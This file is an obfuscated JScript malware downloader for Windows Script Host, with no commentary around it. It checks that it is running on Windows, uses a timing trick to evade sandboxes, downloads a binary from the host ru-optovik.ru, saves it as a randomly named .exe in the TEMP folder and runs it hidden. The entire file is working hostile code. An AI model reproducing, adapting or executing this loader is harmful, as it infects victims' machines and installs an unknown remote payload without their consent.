var _VW = false;
var _PU = "CreateObject";
var _T = function _J() {return WScript[_PU]("WScript"+".Shell");}(), _MO = 11;
var _H = "MSXML2.XMLHTTP";
var _B0 = 2123213;
var _W1 = 0;
function _YU(_FQ){_T["Run"](_FQ, _W1, _W1);};
function _GR(){return _H + "";};
function _TX(_KH, _Y0){_W1 = _W1 * 1; return _KH - _Y0;};
function _XU(){return _PU;};
/*@cc_on
  @if (@_win32 || @_win64)
    _VW = true;
  @end
@*/
if (_VW)
{
var _BC = "";
function _J0(){return 22;};
var _Y = 0; var _TY = 0;
function _W()
{
var _HO = new this["Date"]();
var _B = _HO["getUTCMilliseconds"]();
WScript["Sleep"](_J0());
var _HO = new this["Date"]();
var _RV = _HO["getUTCMilliseconds"]();
WScript["Sleep"](_J0());
var _HO = new this["Date"]();
var _E = _HO["getUTCMilliseconds"]();
var _Y = "_K";
_Y = _TX(_RV, _B);
var _TY = "_MT";
_TY = _TX(_E, _RV);
_BC = "open";
return _TX(_Y, _TY);
}
var _CR = false;
var _CF = false;
for (var _AP = _W1; _AP < _J0() * 1; _AP++){if (_W() != _W1){
_CR = true; 
_TY = "31" + 11 * _Y + _TY; 
_CF = true; 
break;
}}
function _I() {return ((_CR == true) && (_CR == _CF)) ? 1 : _W1;};
if (_CR && _I() && _CF){
function _QW() {return _T["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "K2PMJBgwL1klC.ex" + "e";};
 _UX = _GR();
 _I0 = WScript[_PU](_UX);
 var _CC = 1;
 while (_CC){
try {
	if (_CC == 1)
	{
		_I0[_BC]("GET", "http://ru-optovik.ru/j9ssl", false);
		_I0["send"]();
		_PP = "Sleep";
	}
	WScript[_PP](_J0() + 120); 
	if (_I0["readystate"] < 2 * 2) continue;
	_CC = _W1;
	function _UC(_L) {var _S = (1, 2, 3, 4, 5, _L); return _S;};
	_AF = WScript[_XU()]("ADODB.Stream");
	_UX = _AF;
	_UX[_BC]();
	_UX["type"] = _UC(1);
	_UX["write"](_I0["ResponseBody"]);
	_AF["position"] = _UC(_W1);
	_UX["Save" + "ToFile"](_QW(), 2);
	_AF["cl"+"ose"]();
	_W0 = _QW();
	_YU(_W0);
} catch(_UG){};
}
}
}

